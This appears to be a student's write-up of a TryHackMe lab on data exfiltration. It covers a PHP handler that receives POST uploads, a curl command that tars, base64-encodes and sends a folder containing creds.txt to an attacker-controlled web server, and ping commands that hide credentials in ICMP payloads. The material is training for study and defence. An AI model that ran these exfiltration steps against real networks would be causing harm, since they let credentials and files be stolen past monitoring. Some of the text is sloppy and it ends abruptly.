## Table of Contents



|   |   |   |
|---|---|---|
|**Domain Name**|**IP Address**|**Network Access**|
|jump.thm.com|192.168.0.133|Net 1 and Net 2|
|uploader.thm.com|172.20.0.100|Net 1|
|flag.thm.com|*****.**.*.*****|Net 1|
|victim2.thm.com|172.20.0.101|Net 1|
|web.thm.com|192.168.0.100|Net 2|
|icmp.thm.com|192.168.0.121|Net 2|
|victim1.thm.com|192.168.0.101|Net 2|


HTTP POST Request~
Exfiltration data through the HTTP Protocol is one of the best options becuase it is challenging ti detect. It is touch to distinguish between legitimate and malicious http traffic. We will use the POST HTTP method in the data exfiltration, and the reason is with the get request, all parameters are registers into the log file. While using POST request, it doesnt. the following are some of the POST method benefits:

- POST requests are never cached
- POST requests do not remain in the browser history
- POST requests cannot be bookmarked
- POST requests have no restrictions on **data length**


```
cat /var/log/apache2/access.log

thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm: 
192.168.0.133 - - [29/Apr/2022:11:41:54 +0100] "GET /example.php?flag=VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo= HTTP/1.1" 200 495 "-" "curl/7.68.0"
192.168.0.133 - - [29/Apr/2022:11:42:14 +0100] "POST /example.php HTTP/1.1" 200 395 "-" "curl/7.68.0"
192.168.0.1 - - [20/Jun/2022:06:18:35 +0100] "GET /test.php HTTP/1.1" 200 195 "-" "curl/7.68.0"
thm@web-thm:~$ 
```

the first line is a GET request with a file parameter with exfiltrated data. If you try to decode it using the base64 encoding, you would get the transmitted data, which in this case is thm:tryhackme. While the second request is a POST to example.php, we sent the same base64 data, but it doesnt show what data was transmitted.

The base64 data in your access.log looks different. Decode it to find the flag for question 1

`echo 'VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo' | base64 -d`


Based on the attacker configuration, we can set up either HTTP or HTTPS, the encrypted version of HTTP. We also need a PHP page that handles the POST HTTP request sent to the server.

We will be using the HTTP protocol (not the HTTPS) in our scenario. Now let's assume that an attacker controls the web.thm.com server, and sensitive data must be sent from the JumpBox or  victim1.thm.com machine in our Network 2 environment (192.168.0.0/24).  

To exfiltrate data over the HTTP protocol, we can apply the following steps:

1. An attacker sets up a web server with a data handler. In our case, it will be web.thm.com and the contact.php page as a data handler.
2. A C2 agent or an attacker sends the data. In our case, we will send data using the curl command.
3. The webserver receives the data and stores it. In our case, the contact.php receives the POST request and stores it into /tmp.
4. The attacker logs into the webserver to have a copy of the received data.

Let's follow and apply what we discussed in the previous steps. Remember, since we are using the HTTP protocol, the data will be sent in cleartext. However, we will be using other techniques (tar and base64) to change the data's string format so that it wouldn't be in a human-readable format!

First, we prepared a webserver with a data handler for this task. The following code snapshot is of PHP code to handle POST requests via a file parameter and stores the received data in the /tmp directory as http.bs64 file name.

`<?php
if (isset($_POST['file'])) {
    ```php
$file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>

From the jump machine connect to the victime1.thm.com machine via ssh to exfiltrate the reqired data over the HTTP protocol. 

The goal is to transfer the folder's content, stored in /home/thm/task6, to another machine over the HTTP protocol.

Checking the Secret folder!  

```markup
thm@victim1:~$ ls -l
total 12
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task4
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task5
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task6
drwxr-xr-x 1 root root 4096 Jun 19 19:43 task9
```

Now that we have our data, we will be using the curl command to send an HTTP POST request with the content of the secret folder as follows,

Sending POST data via CURL  

```markup
thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```


Nice! We have received the data, but if you look closely at the http.bs64 file, you can see it is broken base64. This happens due to the URL encoding over the HTTP. The + symbol has been replaced with empty spaces, so let's fix it using the sed command as follows,

thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64


Restoring the Data

```markup
thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
tmp/task6/
tmp/task6/creds.txt
```

Finally, we decoded the base64 string using the base64 command with -d argument, then we passed the decoded file and unarchived it using the tar command.


**Exfiltration using ICMP**

Let's say that we need to exfiltrate the following credentials thm:tryhackme. First, we need to convert it to its Hex representation and then pass it to the ping command using -p options as follows,
root@attackbox$ echo "thm:tryhackme" | xxd -p

We used the xxd command to convert our string to Hex, and then we can use the ping command with the hex value we got from converting the thm:tryhackme

Send Hex using the ping command.  

```markup
root@AttackBox$ ping 10.10.191.98 -c 1 -p 74686d3a7472796861636b6d650a
```

We sent one ICMP packet using the ping command with thm:tryhackme Data. Let's look at the Data section for this packet in the Wireshark.

We have successfully filled the ICMP's data section with out data and manually sent it over the network using the ping command


Attackbox IP: 10.10.14.235

We sent one ICMP packet using the nping command with --data-string argument. We specify the trigger value with the file name BOFfile.txt, set by default in the Metasploit framework. This could be changed from Metasploit if needed!

Now check the AttackBox terminal. If everything is set correctly, the Metasploit framework should identify the trigger value and wait for the data to be written to disk. 

Let's start sending the required data and the end of the file trigger value from the ICMP machine.


[DNS Configurations]



